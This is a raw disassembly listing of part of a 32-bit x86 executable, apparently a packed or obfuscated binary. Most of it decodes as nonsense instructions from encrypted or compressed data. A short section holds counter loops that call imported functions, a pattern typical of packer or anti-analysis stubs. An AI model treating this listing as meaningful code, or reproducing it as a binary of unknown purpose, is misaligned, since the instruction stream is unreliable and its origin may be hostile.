  40a734:	xchg   edx,eax
  40a735:	xor    ecx,DWORD PTR [esi-0x1b]
  40a738:	or     esp,ebp
  40a73a:	ret    
  40a73b:	mov    ecx,0xe52d2ff8
  40a740:	sahf   
  40a741:	hlt    
  40a742:	(bad)  
  40a743:	imul   edi,DWORD PTR [edx-0x38],0x19
  40a747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a748:	jne    0x40a739
  40a74a:	or     al,0x7e
  40a74c:	mov    bh,0x82
  40a74e:	rcl    ah,0xa8
  40a751:	jle    0x40a6f5
  40a753:	iret   
  40a754:	sub    WORD PTR [edx+edi*2],si
  40a758:	int3   
  40a759:	mov    edx,0x6b776df9
  40a75e:	sub    edx,ebp
  40a760:	mov    ch,0x22
  40a762:	sub    al,bl
  40a764:	sub    ebp,DWORD PTR ds:0xf775e9ec
  40a76a:	mov    ch,0x66
  40a76c:	inc    ecx
  40a76d:	xchg   edx,eax
  40a76e:	and    DWORD PTR [esi],ecx
  40a770:	cmp    BYTE PTR [edx-0x11],ch
  40a773:	int3   
  40a774:	cmp    bh,ah
  40a776:	cmp    BYTE PTR [edx-0x1c],al
  40a779:	cli    
  40a77a:	xchg   edx,eax
  40a77b:	stc    
  40a77c:	std    
  40a77d:	in     eax,0x58
  40a77f:	jnp    0x40a7c8
  40a781:	hlt    
  40a782:	aad    0x50
  40a784:	arpl   WORD PTR [ebx+0x1618df41],bx
  40a78a:	pushf  
  40a78b:	fld    QWORD PTR [edi-0x507090b5]
  40a791:	int    0x42
  40a793:	pop    ss
  40a794:	ret    
  40a795:	call   0xf44b262f
  40a79a:	xchg   BYTE PTR [ebp+eax*4+0x38916743],ah
  40a7a1:	push   edx
  40a7a2:	adc    edx,DWORD PTR [esi+0x7a]
  40a7a5:	iret   
  40a7a6:	mov    edi,DWORD PTR [ebx+0x7dd3915e]
  40a7ac:	(bad)  
  40a7ae:	and    bh,bl
  40a7b0:	inc    esp
  40a7b1:	dec    eax
  40a7b2:	sbb    al,0x4d
  40a7b4:	ret    
  40a7b5:	xor    edx,DWORD PTR [ebp+0x39b96c13]
  40a7bb:	dec    edx
  40a7bc:	leave  
  40a7bd:	cmp    DWORD PTR [edi],ecx
  40a7bf:	xor    DWORD PTR ss:[ecx-0x29617b5d],esp
  40a7c6:	sub    eax,0x9fa87f86
  40a7cb:	and    DWORD PTR [esi-0x775c2835],ebx
  40a7d1:	cmp    BYTE PTR [ebp+0x72],dl
  40a7d4:	xchg   edi,eax
  40a7d5:	mul    ch
  40a7d7:	add    eax,0xe7c732c2
  40a7dc:	add    BYTE PTR [edi+0x19],ch
  40a7df:	das    
  40a7e0:	ins    BYTE PTR es:[edi],dx
  40a7e1:	dec    ebx
  40a7e2:	add    al,0xe9
  40a7e4:	enter  0xc61c,0x9d
  40a7e8:	fild   WORD PTR [edi-0x2c]
  40a7eb:	cli    
  40a7ec:	xchg   esp,eax
  40a7ed:	jno    0x40a83a
  40a7ef:	jbe    0x40a7ce
  40a7f1:	pop    edi
  40a7f2:	cmp    al,0xd4
  40a7f4:	inc    eax
  40a7f5:	xchg   ecx,eax
  40a7f6:	cmp    eax,0x69995121
  40a7fb:	jb     0x40a781
  40a7fd:	rcl    DWORD PTR [ecx+esi*1-0x3d8aba65],cl
  40a804:	out    dx,eax
  40a805:	adc    esi,edx
  40a807:	pop    ebx
  40a808:	xchg   edx,eax
  40a809:	rcl    BYTE PTR [ebp+0x6a],0xc1
  40a80d:	pushf  
  40a80e:	frstor [ebx+ebx*4-0x47fc022d]
  40a815:	stc    
  40a816:	jno    0x40a7f5
  40a818:	stos   BYTE PTR es:[edi],al
  40a819:	out    dx,al
  40a81a:	mov    edi,0x5561e543
  40a81f:	pop    edi
  40a820:	mul    DWORD PTR [edx]
  40a822:	sub    BYTE PTR [edx+0x66],bh
  40a825:	inc    eax
  40a826:	in     eax,dx
  40a827:	stos   DWORD PTR es:[edi],eax
  40a828:	pop    ss
  40a829:	sub    eax,0xab63ca2b
  40a82e:	xchg   DWORD PTR [edi],edi
  40a830:	test   BYTE PTR [edx+ebx*1],ah
  40a833:	popa   
  40a834:	imul   ebx,DWORD PTR ds:0xc0ca7f1f,0xffffff81
  40a83b:	test   BYTE PTR [edx],0xc2
  40a83e:	fdivr  QWORD PTR [edi+0x225f3d2a]
  40a844:	inc    BYTE PTR [ebp-0x16]
  40a847:	sub    ecx,DWORD PTR [edx]
  40a849:	jno    0x40a7e7
  40a84b:	add    DWORD PTR [ebp-0x7617ba73],edx
  40a851:	inc    ebp
  40a852:	fadd   QWORD PTR [ecx+0x4302dd35]
  40a858:	add    BYTE PTR [ebx],dl
  40a85a:	pop    edi
  40a85b:	add    BYTE PTR [eax],al
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x4302e9,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x45ac5287],bl
  40a93e:	mov    WORD PTR [ecx+0x2e7e7ee1],ds
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a926
  40a948:	je     0x40a901
  40a94a:	xchg   edi,eax
  40a94b:	sbb    DWORD PTR [ecx+0x177f99ad],esp
  40a951:	jmp    0x38cce731
  40a956:	sbb    al,0xc9
  40a958:	aam    0x46
  40a95a:	xchg   DWORD PTR [edi+0x4a237693],ebp
  40a960:	cmp    bl,BYTE PTR [edx]
  40a962:	xlat   BYTE PTR ds:[ebx]
  40a963:	mov    ebp,0x2144fd71
  40a968:	stos   BYTE PTR es:[edi],al
  40a969:	xchg   BYTE PTR [edi-0x78],cl
  40a96c:	js     0x40a9bf
  40a96e:	lahf   
  40a96f:	xchg   edx,eax
  40a970:	aaa    
  40a971:	mov    ah,0xc6
  40a973:	in     eax,0x8c
  40a975:	and    BYTE PTR [edi+0x7f29dbea],bh
  40a97b:	mov    BYTE PTR [esi+0x78],cl
  40a97e:	cmc    
  40a97f:	int3   
  40a980:	out    dx,al
  40a981:	pop    esi
  40a982:	pop    ds
  40a983:	or     eax,0x923a0d2d
  40a988:	or     eax,0x814c07e3
  40a98d:	push   eax
  40a98e:	mov    esp,0xf9610bba
  40a993:	fwait
  40a994:	dec    ecx
  40a995:	mov    ch,0x21
  40a997:	mov    eax,0xbf7cf79a
  40a99c:	jp     0x40a97d
  40a99e:	fs push edx
  40a9a0:	or     al,0x84
  40a9a2:	dec    ecx
  40a9a3:	mov    al,0x41
  40a9a5:	jb     0x40a9b9
  40a9a7:	adc    edx,esi
  40a9a9:	repnz adc al,0x13
  40a9ac:	xor    bh,al
  40a9ae:	ss xchg esp,eax
  40a9b0:	ins    BYTE PTR es:[edi],dx
  40a9b1:	lds    esi,FWORD PTR [ebx+ebx*4-0xf23748a]
  40a9b8:	inc    eax
  40a9b9:	xor    cl,bl
  40a9bb:	(bad)  
  40a9bc:	pop    edi
  40a9bd:	pop    ecx
  40a9be:	push   esp
  40a9bf:	xchg   DWORD PTR [esi],ebp
  40a9c1:	dec    edx
  40a9c2:	jae    0x40a996
  40a9c4:	call   0x7825:0x41109d2c
  40a9cb:	daa    
  40a9cc:	xor    ecx,DWORD PTR [ecx+0x42]
  40a9cf:	data16 (bad) 
  40a9d1:	(bad)  
  40a9d2:	iret   
  40a9d3:	mov    DWORD PTR [ebx+0x4d],esp
  40a9d6:	sti    
  40a9d7:	rcr    BYTE PTR [esi+0x39],1
  40a9da:	sub    dl,cl
  40a9dc:	or     bh,BYTE PTR [ebp-0x21]
  40a9df:	dec    esp
  40a9e0:	outs   dx,DWORD PTR ds:[esi]
  40a9e1:	or     al,BYTE PTR [bx+di+0x4962]
  40a9e6:	(bad)  
  40a9e7:	les    esi,FWORD PTR [ebx-0x5e509c34]
  40a9ed:	ds push esi
  40a9ef:	call   0x93733575
  40a9f4:	in     eax,0xc9
  40a9f6:	push   ds
  40a9f7:	adc    edx,esi
  40a9f9:	int3   
  40a9fa:	pandn  mm4,QWORD PTR [ecx]
  40a9fd:	pop    edx
  40a9fe:	jp     0x40aa2e
  40aa00:	gs xor eax,0x8c88fe0f
  40aa06:	dec    esi
  40aa07:	div    BYTE PTR [ebx]
  40aa09:	fisttp DWORD PTR [ebx]
  40aa0b:	or     esi,ecx
  40aa0d:	call   0x258c8f42
  40aa12:	cmp    DWORD PTR [eax-0x5d232df2],edx
  40aa18:	dec    ecx
  40aa19:	(bad)  
  40aa1b:	neg    BYTE PTR [eax-0x17c061b6]
  40aa21:	pop    es
  40aa22:	inc    esi
  40aa23:	jbe    0x40aa38
  40aa25:	or     ah,BYTE PTR [esi-0x62]
  40aa28:	xchg   esi,eax
  40aa29:	cmp    BYTE PTR [ecx],dl
  40aa2b:	es dec ecx
  40aa2d:	mov    eax,0xcf85c5f4
  40aa32:	out    0xa0,eax
  40aa34:	push   edx
  40aa35:	in     eax,dx
  40aa36:	(bad)  
  40aa37:	mov    ebp,0x9be5e719
  40aa3c:	jbe    0x40aa0a
  40aa3e:	aam    0x38
  40aa40:	or     ch,al
  40aa42:	xor    BYTE PTR [ecx-0x5c],ah
  40aa45:	sbb    ebx,DWORD PTR [ebx-0x11f57d64]
  40aa4b:	inc    esi
  40aa4c:	xor    ebx,DWORD PTR [ecx]
  40aa4e:	push   esp
  40aa4f:	mov    es,edi
  40aa51:	mov    ds:0x89d1456b,eax
  40aa56:	xchg   DWORD PTR [ecx],esi
  40aa58:	aas    
  40aa59:	mov    eax,ds:0x18226095
  40aa5e:	inc    ebp
  40aa5f:	xor    eax,0x845987e2
  40aa64:	and    bl,ch
  40aa66:	lock outs dx,DWORD PTR ds:[esi]
  40aa68:	push   esp
  40aa69:	aam    0x22
  40aa6b:	aaa    
  40aa6c:	mov    dh,0xeb
  40aa6e:	adc    al,BYTE PTR [edx+edx*4+0x78]
  40aa72:	adc    al,0x80
  40aa74:	cmp    al,0x71
  40aa76:	cmp    al,0xf4
  40aa78:	or     edx,0x17
  40aa7b:	mov    edx,0x84538766
  40aa80:	shl    DWORD PTR [esi+0x41c42d76],1
  40aa86:	(bad)  
  40aa87:	sbb    cl,bh
  40aa89:	sbb    BYTE PTR [edi+eax*8-0x1],bh
  40aa8d:	and    ch,BYTE PTR [esi+esi*1+0x29f7f6cb]
  40aa94:	mov    fs,WORD PTR ds:[eax-0x63]
  40aa98:	cld    
  40aa99:	hlt    
  40aa9a:	cmp    ecx,esi
  40aa9c:	dec    ebp
  40aa9d:	sub    al,0xe7
  40aa9f:	cmp    BYTE PTR [esi+0x5e140ce9],0xd0
  40aaa6:	jb     0x40aaa7
  40aaa8:	es retf 0x4701
  40aaac:	and    edx,0x5c
  40aaaf:	aad    0x1e
  40aab1:	ds push ss
  40aab3:	push   eax
  40aab4:	sub    bl,bl
  40aab6:	shl    DWORD PTR [edx+esi*4-0x23],1
  40aaba:	pop    edx
  40aabb:	pop    esp
  40aabc:	and    ebp,esi
  40aabe:	or     al,0x5c
  40aac0:	test   eax,0x957d3833
  40aac5:	sbb    BYTE PTR [ebp-0x12],0x24
  40aac9:	add    cl,dl
  40aacb:	push   ebp
  40aacc:	jns    0x40ab0f
  40aace:	stos   BYTE PTR es:[edi],al
  40aacf:	mov    edx,0x2784454c
  40aad4:	and    ecx,edx
  40aad6:	jae    0x40aa68
  40aad8:	in     al,0x2b
  40aada:	pop    es
  40aadb:	stos   BYTE PTR es:[edi],al
  40aadc:	imul   ebx,esi,0x14a72dd6
  40aae2:	sub    BYTE PTR [eax+0x74f19fa8],0x6c
  40aae9:	or     al,0x52
  40aaeb:	push   0xfffffffb
  40aaed:	mov    dl,BYTE PTR [edi+0x356661bd]
  40aaf3:	(bad)  
  40aaf4:	pop    ebp
  40aaf5:	xor    al,0x37
  40aaf7:	cwde   
  40aaf8:	popf   
  40aaf9:	retf   
  40aafa:	jbe    0x40ab79
  40aafc:	push   ds
  40aafd:	push   esp
  40aafe:	xchg   ecx,eax
  40aaff:	aad    0x55
  40ab01:	inc    esp
  40ab02:	or     bl,BYTE PTR [edi]
  40ab04:	js     0x40aa8e
  40ab06:	mov    ecx,0xc2413a90
  40ab0b:	pushw  0xfa54
  40ab0f:	icebp  
  40ab10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab11:	fwait
  40ab12:	outs   dx,DWORD PTR ds:[esi]
  40ab13:	loope  0x40aaf4
  40ab15:	aas    
  40ab16:	jp     0x40ab91
  40ab18:	inc    edx
  40ab19:	popf   
  40ab1a:	in     al,0xdf
  40ab1c:	gs test al,0x82
  40ab1f:	pushf  
  40ab20:	dec    edi
  40ab21:	mov    dl,0xb4
  40ab23:	in     al,0x90
  40ab25:	jmp    0x40ab70
  40ab27:	and    ah,dl
  40ab29:	xor    ch,ah
  40ab2b:	test   al,0xd8
  40ab2d:	repnz ds dec eax
  40ab30:	xchg   edx,eax
  40ab31:	mov    dh,BYTE PTR [eax+0x3]
  40ab34:	mov    cl,0x45
  40ab36:	xor    BYTE PTR [edi-0x3c12ae03],ch
  40ab3c:	sub    ecx,edx
  40ab3e:	adc    eax,0x402a981d
  40ab43:	ins    BYTE PTR es:[edi],dx
  40ab44:	jecxz  0x40ab9c
  40ab46:	stos   DWORD PTR es:[edi],eax
  40ab47:	and    bh,BYTE PTR [ecx+ebp*4]
  40ab4a:	sbb    BYTE PTR [esi-0x5c],bh
  40ab4d:	mov    ebx,0xd9abc8c3
  40ab52:	ja     0x40abce
  40ab54:	add    dh,BYTE PTR ds:[edi+0x4f]
  40ab58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab59:	test   al,0xe
  40ab5b:	jecxz  0x40ab23
  40ab5d:	xlat   BYTE PTR ds:[ebx]
  40ab5e:	out    0xe0,eax
  40ab60:	in     al,0xde
  40ab62:	xchg   edx,eax
  40ab63:	mov    dl,0x3b
  40ab65:	stos   DWORD PTR es:[edi],eax
  40ab66:	adc    esi,DWORD PTR [eax]
  40ab68:	jns    0x40ab48
  40ab6a:	pop    edi
  40ab6b:	ins    BYTE PTR es:[edi],dx
  40ab6c:	dec    eax
  40ab6d:	dec    ebx
  40ab6e:	int    0xb0
  40ab70:	or     eax,DWORD PTR [edi-0x1d]
  40ab73:	add    eax,0x9da33bd3
  40ab78:	mov    eax,0xc443f6d
  40ab7d:	jecxz  0x40ab77
  40ab7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab80:	fisttp QWORD PTR [ebx]
  40ab82:	mov    al,ds:0x7656eedd
  40ab87:	lods   al,BYTE PTR ds:[esi]
  40ab88:	cs mov ch,0xd8
  40ab8b:	daa    
  40ab8c:	pop    eax
  40ab8d:	add    al,0x64
  40ab8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab90:	iret   
  40ab91:	pop    ds
  40ab92:	mov    ecx,0xf682b8c8
  40ab97:	aad    0xc4
  40ab99:	inc    eax
  40ab9a:	xor    eax,0x1362181b
  40ab9f:	adc    al,0x51
  40aba1:	dec    edi
  40aba2:	call   0x7d8f:0x16d4b50b
  40aba9:	jmp    0xd0493770
  40abae:	mov    ch,0x3f
  40abb0:	ins    DWORD PTR es:[edi],dx
  40abb1:	sbb    eax,0xb67da51e
  40abb6:	dec    esp
  40abb7:	stos   BYTE PTR es:[edi],al
  40abb8:	push   ebx
  40abb9:	fdiv   QWORD PTR [edx-0x4fbfd978]
  40abbf:	and    dh,bh
  40abc1:	aas    
  40abc2:	jge    0x40abc7
  40abc4:	fsubr  st(0),st
  40abc6:	ja     0x40abff
  40abc8:	adc    bl,BYTE PTR [edx+0x3a99e9c5]
  40abce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcf:	sar    DWORD PTR [ebp-0x26c6fa74],1
  40abd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd7:	daa    
  40abd8:	push   eax
  40abd9:	ins    DWORD PTR es:[edi],dx
  40abda:	and    ah,BYTE PTR [edi]
  40abdc:	and    ah,BYTE PTR [edi+0xb]
  40abdf:	xchg   esp,edx
  40abe1:	int    0x32
  40abe3:	sahf   
  40abe4:	neg    DWORD PTR [ebx+0x4e]
  40abe7:	push   esi
  40abe8:	rol    BYTE PTR [edx+ecx*1],0x87
  40abec:	outs   dx,DWORD PTR ds:[esi]
  40abed:	cmp    edi,edi
  40abef:	xchg   DWORD PTR ds:0x3b7b4d7f,ebx
  40abf5:	inc    ebp
  40abf6:	or     BYTE PTR [edx+0x27efeeee],0x5a
  40abfd:	xchg   ecx,edi
  40abff:	adc    DWORD PTR [ebx+edi*1+0x60],edx
  40ac03:	sbb    BYTE PTR [esi-0x6ba2a90e],ch
  40ac09:	and    DWORD PTR [eax-0x5a544897],esi
  40ac0f:	ins    DWORD PTR es:[edi],dx
  40ac10:	shl    DWORD PTR [ebx+0x16],1
  40ac13:	shr    DWORD PTR [edx],1
  40ac15:	fcomp  QWORD PTR ds:0x82d6444c
  40ac1b:	aam    0xdb
  40ac1d:	sub    cl,0x9f
  40ac20:	push   ebx
  40ac21:	into   
  40ac22:	lahf   
  40ac23:	push   cs
  40ac24:	fldcw  WORD PTR [ebp-0x17642b6a]
  40ac2a:	mov    bl,0xd9
  40ac2c:	mov    ebx,DWORD PTR [ecx-0x2]
  40ac2f:	or     BYTE PTR [edx],ch
  40ac31:	imul   edi,DWORD PTR [ebp+0x74],0xe6374146
  40ac38:	and    eax,eax
  40ac3a:	pop    ss
  40ac3b:	cdq    
  40ac3c:	test   DWORD PTR [esi-0x9],esp
  40ac3f:	push   edx
  40ac40:	outs   dx,DWORD PTR ds:[esi]
  40ac41:	(bad)  
  40ac42:	and    esi,ebp
  40ac44:	mov    ecx,0xd926a6e4
  40ac49:	test   BYTE PTR [ebp+esi*2-0x265a0957],bh
  40ac50:	clc    
  40ac51:	fisttp WORD PTR [edi]
  40ac53:	xchg   BYTE PTR [ebx+0x175088fc],bl
  40ac59:	daa    
  40ac5a:	daa    
  40ac5b:	cmc    
  40ac5c:	enter  0x7878,0xc
  40ac60:	dec    ecx
  40ac61:	aas    
  40ac62:	dec    ebp
  40ac63:	mov    ebx,0x41f1ea67
  40ac68:	pop    esi
  40ac69:	pop    es
  40ac6a:	and    DWORD PTR [edx+0x10],edx
  40ac6d:	pop    ebx
  40ac6e:	jecxz  0x40ac5f
  40ac70:	sbb    al,0x21
  40ac72:	pop    esi
  40ac73:	arpl   cx,bx
  40ac75:	out    0x3e,al
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	(bad)  
  40ac93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac94:	sub    eax,0x7eec49f5
  40ac99:	jle    0x40acc9
  40ac9b:	jge    0x40ad1b
  40ac9d:	jle    0x40ace7
  40ac9f:	mov    ah,0x48
  40aca1:	int3   
  40aca2:	sbb    BYTE PTR [ecx+0x4444315],0xa5
  40aca9:	pop    edi
  40acaa:	and    eax,0x2d8fc5f9
  40acaf:	outs   dx,DWORD PTR ds:[esi]
  40acb0:	int    0x16
  40acb2:	cli    
  40acb3:	dec    ecx
  40acb4:	outs   dx,DWORD PTR ds:[esi]
  40acb5:	mov    cl,0xc4
  40acb7:	icebp  
  40acb8:	mov    esi,0xcbc18ea2
  40acbd:	push   ebx
  40acbe:	(bad)  
  40acbf:	test   al,0x79
  40acc1:	jno    0x40ac8a
  40acc3:	shl    DWORD PTR [esi+0x6d572776],cl
  40acc9:	mov    esp,0x9ab673dd
  40acce:	pop    esi
  40accf:	in     eax,0x82
  40acd1:	jle    0xc7dcce6
  40acd7:	test   al,0x60
  40acd9:	scas   eax,DWORD PTR es:[edi]
  40acda:	sub    bh,BYTE PTR [ebx+edi*2-0x33142b8e]
  40ace1:	dec    eax
  40ace2:	push   ds
  40ace3:	shl    bl,1
  40ace5:	jmp    0x40ad3a
  40ace7:	dec    edi
  40ace8:	cmp    esp,DWORD PTR [ebx+0x28]
  40aceb:	and    eax,DWORD PTR [ebp+0x59]
  40acee:	ja     0x40ad2b
  40acf0:	push   edi
  40acf1:	sub    esi,DWORD PTR [ecx-0x39]
  40acf4:	xor    BYTE PTR [edi+0x76],dh
  40acf7:	out    dx,al
  40acf8:	ss xchg ebp,eax
  40acfa:	shl    bh,0x66
  40acfd:	xor    al,0x67
  40acff:	dec    edi
  40ad00:	mov    esi,0x47ba44a7
  40ad05:	and    eax,0x359eb968
  40ad0a:	lods   eax,DWORD PTR ds:[esi]
  40ad0b:	scas   eax,DWORD PTR es:[edi]
  40ad0c:	lds    ebx,FWORD PTR [ecx]
  40ad0e:	fs push ds
  40ad10:	neg    BYTE PTR [ecx+0x6be18f6a]
  40ad16:	mov    ch,0x7
  40ad18:	dec    edi
  40ad19:	rol    ebx,0x5c
  40ad1c:	sub    DWORD PTR [ecx],ecx
  40ad1e:	and    al,0x5f
  40ad20:	mov    al,ds:0x91c82029
  40ad25:	std    
  40ad26:	lahf   
  40ad27:	(bad)  
  40ad28:	push   ecx
  40ad29:	shr    BYTE PTR [edi-0x13],cl
  40ad2c:	pop    edx
  40ad2d:	rol    BYTE PTR [ebp+ecx*8+0x35c08a38],cl
  40ad34:	(bad)  
  40ad35:	push   0x866f7eac
  40ad3a:	jne    0x40adaa
  40ad3c:	xchg   ecx,eax
  40ad3d:	jge    0x40adb8
  40ad3f:	loopne 0x40ad85
  40ad41:	and    ebp,eax
  40ad43:	jg     0x40ad30
  40ad45:	ja     0x40ad98
  40ad47:	(bad)  
  40ad49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad4a:	imul   edi,DWORD PTR [ecx],0x76
  40ad4d:	adc    DWORD PTR [edx],edi
  40ad4f:	xchg   ebp,eax
  40ad50:	loope  0x40ad8a
  40ad52:	mov    gs,ebp
  40ad54:	xchg   dh,cl
  40ad56:	dec    DWORD PTR [esi-0x13142cb3]
  40ad5c:	sbb    BYTE PTR [edx+ebx*2+0x19],bh
  40ad60:	dec    eax
  40ad61:	cwde   
  40ad62:	xchg   ebp,eax
  40ad63:	cmp    DWORD PTR [esi],eax
  40ad65:	shr    DWORD PTR [eax+0x37],0x8d
  40ad69:	scas   eax,DWORD PTR es:[edi]
  40ad6a:	mov    bh,0xf1
  40ad6c:	mov    dh,0x8b
  40ad6e:	mov    ss,WORD PTR [edi-0x31cc6f48]
  40ad74:	jo     0x40ad25
  40ad76:	or     BYTE PTR [esi],dl
  40ad78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad79:	out    dx,al
  40ad7a:	jno    0x40ad05
  40ad7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad7d:	cdq    
  40ad7e:	arpl   WORD PTR [ecx],sp
  40ad80:	sub    ebp,ecx
  40ad82:	mov    ds:0x532d9938,eax
  40ad87:	and    ebx,DWORD PTR [ebx-0x8]
  40ad8a:	pusha  
  40ad8b:	lahf   
  40ad8c:	xchg   ebx,eax
  40ad8d:	sbb    eax,0x879a07ac
  40ad92:	fcmovu st,st(7)
  40ad94:	mov    ds:0xbb7959c7,eax
  40ad99:	lahf   
  40ad9a:	gs mov ebp,0x1b9540d7
  40ada0:	pop    ecx
  40ada1:	out    dx,al
  40ada2:	aaa    
  40ada3:	into   
  40ada4:	or     cl,BYTE PTR [edi]
  40ada6:	push   eax
  40ada7:	icebp  
  40ada8:	sub    ebp,DWORD PTR [ecx+0x2613293b]
  40adae:	lahf   
  40adaf:	mov    dl,0x75
  40adb1:	jle    0x40ad69
  40adb3:	(bad)  [edx+0x7c]
  40adb6:	dec    ecx
  40adb7:	cmp    eax,DWORD PTR [edx-0x7af584b7]
  40adbd:	and    DWORD PTR [edi],0x2ce0355c
  40adc3:	inc    ecx
  40adc4:	push   eax
  40adc5:	and    DWORD PTR [ebx+ebp*2+0x6e2b18c3],esp
  40adcc:	fisub  WORD PTR [edx]
  40adce:	add    eax,0xf7f989be
  40add3:	fadd   st(2),st
  40add5:	and    bh,BYTE PTR [edi+0x52]
  40add8:	lods   eax,DWORD PTR ds:[esi]
  40add9:	adc    eax,0x2d547626
  40adde:	jno    0x40ae12
  40ade0:	fstp   TBYTE PTR ds:0x2c06c6ca
  40ade6:	xor    al,0x9d
  40ade8:	sub    ah,BYTE PTR [edx+0x7d9bd66f]
  40adee:	out    dx,al
  40adef:	add    ebp,DWORD PTR [eax+0x3c]
  40adf2:	push   eax
  40adf3:	int    0xd5
  40adf5:	jns    0x40add3
  40adf7:	jns    0x40ae0a
  40adf9:	fmul   DWORD PTR [edx-0x3d]
  40adfc:	and    esp,DWORD PTR [esi-0x45d5bf3d]
  40ae02:	lock les eax,FWORD PTR [edx]
  40ae05:	das    
  40ae06:	xchg   ebp,eax
  40ae07:	jmp    0x82f97b85
  40ae0c:	sbb    BYTE PTR [edi],bh
  40ae0e:	test   eax,0x2043efd1
  40ae13:	xlat   BYTE PTR ds:[ebx]
  40ae14:	push   ebx
  40ae15:	xchg   edi,eax
  40ae16:	dec    esi
  40ae17:	mov    esp,0x902de625
  40ae1c:	pushf  
  40ae1d:	and    al,0x3a
  40ae1f:	xor    esi,DWORD PTR [esi+edi*8+0x13]
  40ae23:	dec    ebp
  40ae24:	xor    esp,DWORD PTR [edx-0x8]
  40ae27:	mov    ds:0xbf92a648,eax
  40ae2c:	pop    ds
  40ae2d:	repnz iret 
  40ae2f:	loope  0x40ade3
  40ae31:	jae    0x40ae49
  40ae33:	mov    eax,ds:0xbfda46f9
  40ae38:	test   eax,ecx
  40ae3a:	inc    esi
  40ae3b:	ret    
  40ae3c:	fcmovb st,st(0)
  40ae3e:	jo     0x40ae44
  40ae40:	or     esp,DWORD PTR [eax-0x76]
  40ae43:	push   ecx
  40ae44:	int3   
  40ae45:	xchg   esp,eax
  40ae46:	jbe    0x40ae2e
  40ae48:	mov    cl,0x18
  40ae4a:	hlt    
  40ae4b:	mov    dh,0x44
  40ae4d:	add    ch,ch
  40ae4f:	rcr    DWORD PTR [eax],0xa8
  40ae52:	(bad)  
  40ae54:	xor    BYTE PTR [ecx],ah
  40ae56:	push   ebp
  40ae57:	imul   ecx,DWORD PTR [eax-0xa],0x3f
  40ae5b:	pop    esp
  40ae5c:	dec    esi
  40ae5d:	and    DWORD PTR [ebx+0x14],ebp
  40ae60:	sub    eax,ebp
  40ae62:	cmp    al,0xbd
  40ae64:	or     al,0x88
  40ae66:	pop    ss
  40ae67:	pop    esi
  40ae68:	push   esp
  40ae69:	jmp    0x5863b14d
  40ae6e:	and    bh,0x89
  40ae71:	xchg   BYTE PTR [edx+0x4c8ca4c9],bh
  40ae77:	popa   
  40ae78:	cmp    ebx,edi
  40ae7a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ae7c:	push   edi
  40ae7d:	jp     0x40aeaa
  40ae7f:	sub    al,0x2c
  40ae81:	mov    eax,ds:0xcf7792b2
  40ae86:	add    BYTE PTR [esi+0x6b],dl
  40ae89:	sub    esp,DWORD PTR [eax+eiz*8-0x4dc6d5f7]
  40ae90:	je     0x40aec6
  40ae92:	jg     0x40ae9a
  40ae94:	or     al,0x73
  40ae96:	jne    0x40aee6
  40ae98:	iret   
  40ae99:	fisub  WORD PTR [esi+0x1819c6f7]
  40ae9f:	add    esi,DWORD PTR [esi-0x798955f9]
  40aea5:	mov    cl,0xbf
  40aea7:	fnstenv [ebp+0x49]
  40aeaa:	int3   
  40aeab:	push   esi
  40aeac:	sbb    al,0xf3
  40aeae:	inc    ebp
  40aeaf:	push   ecx
  40aeb0:	xor    cl,BYTE PTR [esp+ebp*2+0xa]
  40aeb4:	xchg   edx,eax
  40aeb5:	retf   
  40aeb6:	lea    edi,ds:0x1ba990d5
